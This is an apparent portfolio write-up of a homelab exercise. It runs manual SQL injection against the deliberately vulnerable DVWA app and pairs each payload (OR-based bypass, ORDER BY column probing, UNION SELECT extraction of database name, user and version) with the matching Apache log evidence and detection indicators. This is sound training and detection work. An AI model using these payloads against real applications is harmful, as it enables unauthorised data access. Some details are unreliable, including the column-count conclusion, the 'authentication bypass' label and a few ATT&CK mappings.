# Phase 2 & 3 — SQL Injection Attack & Log Analysis (Purple Team)

**Project:** SQL Injection Detection Homelab  
**Author:** Didde Isaac | SOC Analyst Portfolio  
**Phase Focus:** Manual Attack Execution + Real-Time Log Analysis

---

## Overview

This phase covers both the offensive execution of SQL Injection attacks against DVWA and the simultaneous defensive analysis of how those attacks appear in Apache web server logs. It bridges the gap between attacker behavior and SOC analyst detection workflow.

---

## Objectives

- Perform manual SQL Injection attacks on DVWA
- Understand how SQL queries are manipulated by payloads
- Monitor Apache logs in real time during attack execution
- Identify and document attack patterns from a defender perspective
- Map observed techniques to MITRE ATT&CK

---

## Tools & Environment

| Role | Tool |
|---|---|
| Attacker OS | Kali Linux |
| Target Application | DVWA on Ubuntu Server |
| Log Monitoring | Apache `access.log` |
| Method | Manual SQL Injection |

---

## Lab Preparation

**DVWA Security Level:**
```
DVWA Security → LOW
```

**Real-time log monitoring on Ubuntu Server:**
```bash
tail -f /var/log/apache2/access.log
```

---

## Attack Execution

---

### Attack 1 — Authentication Bypass

**Payload:**
```
1' OR '1'='1
```

**Query Manipulation:**

Original query:
```sql
SELECT * FROM users WHERE id = '1';
```

Injected query:
```sql
SELECT * FROM users WHERE id = '1' OR '1'='1';
```

The condition always evaluates to TRUE, returning all records.

**Result:** Multiple user records displayed — authentication bypass successful.

**Log Evidence:**
```
GET /dvwa/vulnerabilities/sqli/?id=1'%20OR%20'1'%3D'1 HTTP/1.1
```

**Detection Insight:**
- Presence of `' OR` indicates logical bypass
- Highly suspicious input pattern — high confidence SQLi indicator

---

### Attack 2 — Column Enumeration

**Payloads:**
```
1' ORDER BY 1 --
1' ORDER BY 2 --
```

**Observation:**

| Payload | Response |
|---|---|
| `ORDER BY 1` | Success — page loads normally |
| `ORDER BY 2` | Error — HTTP 500 |

**Conclusion:** Column count = **1**

**Log Evidence:**
```
ORDER BY 1
ORDER BY 2
```

**Detection Insight:**
- Sequential `ORDER BY` probing is a classic enumeration pattern
- HTTP 500 errors triggered by injection payloads are high-value alert candidates

---

### Attack 3 — Database Name Extraction

**Payload:**
```
1' UNION SELECT database() --
```

**Result:** Database name revealed — `dvwa`

**Log Evidence:**
```
UNION SELECT database()
```

**Detection Insight:**
- `UNION SELECT` is one of the strongest SQLi indicators in HTTP logs
- Combined with function calls like `database()`, confirms active data extraction

---

### Attack 4 — Database User Extraction

**Payload:**
```
1' UNION SELECT user() --
```

**Result:** Current DB user revealed — `dvwa@localhost`

---

### Attack 5 — Database Version Extraction

**Payload:**
```
1' UNION SELECT version() --
```

**Result:** MySQL version string revealed.

---

## Log Analysis Summary

### Observed Attack Patterns

| Pattern | Meaning | Confidence |
|---|---|---|
| `' OR` | Authentication bypass | High |
| `UNION SELECT` | Data extraction | High |
| `ORDER BY` | Column enumeration | Medium |
| `%20`, `%27`, `%3D` | URL-encoded payloads | Medium |

### Sample Log Entries

```
GET /dvwa/vulnerabilities/sqli/?id=1'%20OR%20'1'%3D'1 HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=1'%20UNION%20SELECT%20database() HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=1'%20ORDER%20BY%201-- HTTP/1.1
GET /dvwa/vulnerabilities/sqli/?id=1'%20UNION%20SELECT%20user() HTTP/1.1
```

> IP addresses partially masked (192.168.0.xxx) for privacy. Attack patterns preserved for analysis.

---

## Attacker vs. Defender Mapping

| Attacker Action | Defender Observation |
|---|---|
| Inject authentication bypass | `' OR` pattern in access.log |
| Enumerate column count | Sequential `ORDER BY` with HTTP 500 error |
| Extract database name | `UNION SELECT database()` in request |
| Extract database user | `UNION SELECT user()` in request |
| Extract DB version | `UNION SELECT version()` in request |

---

## MITRE ATT&CK Mapping

| Technique | ID | Phase | Description |
|---|---|---|---|
| Exploit Public-Facing Application | T1190 | Phase 2 (Attack) | Manual SQLi against DVWA login and query pages |
| System Information Discovery | T1082 | Phase 2 (Attack) | Column enumeration using `ORDER BY` |
| Data from Local System | T1005 | Phase 2 (Attack) | Database name, user, and version extracted via `UNION SELECT` |
| Log Enumeration | T1654 | Phase 3 (Detection) | Apache access logs reviewed to identify attack evidence |
| Network Traffic Analysis | T1040 | Phase 3 (Detection) | HTTP request patterns monitored for SQLi indicators |

---

## Challenges & Fixes

| Issue | Cause | Fix |
|---|---|---|
| HTTP 500 error during UNION | Incorrect column count in UNION query | Used `ORDER BY` first to determine column count |
| Payload not showing output | Output column mismatch | Adjusted UNION payload to match visible output column |
| URL-encoded values in logs | Browser/tool encodes special characters | Decoded `%20` → space, `%27` → `'`, `%3D` → `=` manually |

---

## Key Learnings

- SQL Injection relies on understanding query structure — manual testing before automation builds real intuition
- Even simple payloads can extract sensitive database information
- Apache logs provide full visibility of attacker behavior in HTTP requests
- URL encoding is a passive obfuscation technique that shows up clearly in raw logs
- Sequential error-based patterns (like `ORDER BY` probing) are detectable without a SIEM

---

## Next Phase

**Phase 4 — Automated Attack (sqlmap):** Running sqlmap to generate high-volume attack traffic and comparing automated tool signatures against manually crafted payloads observed in this phase.
